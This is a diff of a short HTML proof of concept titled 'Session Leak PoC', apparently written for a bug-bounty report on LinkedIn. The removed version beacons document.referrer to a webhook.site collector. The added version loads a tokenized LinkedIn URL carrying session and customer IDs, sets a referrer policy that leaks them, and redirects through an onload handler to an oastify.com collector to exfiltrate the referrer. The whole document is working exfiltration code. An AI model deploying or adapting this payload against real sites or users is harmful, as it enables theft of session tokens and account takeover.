@@ -1,9 +1,13 @@
 <!DOCTYPE html>
 <html>
+  <head><title>Session Leak PoC</title></head>
   <body>
-    <script>
-      var i = new Image();
-      i.src = "https://webhook.site/2ad80383-5235-4a99-80ad-208cbaffe255?ref=" + encodeURIComponent(document.referrer);
-    </script>
+    <h1>Session Leak PoC</h1>
+
+    <!-- Replace the real tokenized LinkedIn URL below -->
+    <img src="https://merchantpool1.linkedin.com/?session_id=4b6035c4-8d81-4780-8887-fbd1af53e03b&CustomerId=fb6bbd47-fa7c-4264-b4e9-b25948407586" 
+         alt="image"
+         referrerpolicy="no-referrer-when-downgrade"
+         onload="document.location='c6j1lkb089iwhg252kyrj6mmsdy4muaj.oastify.com/leak?ref=' + encodeURIComponent(document.referrer)">
   </body>
 </html>
